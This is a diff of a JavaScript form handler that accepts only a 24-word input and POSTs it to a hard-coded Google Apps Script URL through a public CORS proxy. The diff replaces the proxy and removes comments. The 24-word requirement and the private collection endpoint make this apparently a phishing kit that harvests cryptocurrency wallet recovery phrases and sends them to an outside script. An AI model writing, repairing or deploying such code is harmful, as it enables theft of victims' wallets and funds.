@@ -1,6 +1,5 @@
-// Function to handle form submission
 function handleSubmit(event) {
-    event.preventDefault(); // Prevent default form submission
+    event.preventDefault();
 
     const errorElement = document.getElementById('emsg');
     errorElement.textContent = '';
@@ -22,14 +21,14 @@ function handleSubmit(event) {
         myButton.disabled = false;
         myButton2.disabled = false;
         form.reset();
-        return; // Exit function if word count is not 24
+        return;
     }
 
-    // Google Apps Script URL (with CORS proxy)
+    // Google Apps Script URL
     const scriptURL = "https://script.google.com/macros/s/AKfycbxK8VQMGkMc4gdlpo_GKoivsuWs4xQvwkynfZJ0E7qBlvcSY271Dq-pOcpIM4ci8WMP/exec";
-    const proxyURL = "https://cors-anywhere.herokuapp.com/" + scriptURL;
+    const proxyURL = "https://api.allorigins.win/raw?url=" + encodeURIComponent(scriptURL);
 
-    // Send POST request using fetch with CORS proxy
+    // Send POST request
     fetch(proxyURL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -51,7 +50,6 @@ function handleSubmit(event) {
     });
 }
 
-// Add event listener to the form for 'submit' event
-const form = document.getElementById('myForm'); 
-form.addEventListener('submit', handleSubmit);
+// Attach event listener
+document.getElementById('myForm').addEventListener('submit', handleSubmit);
 
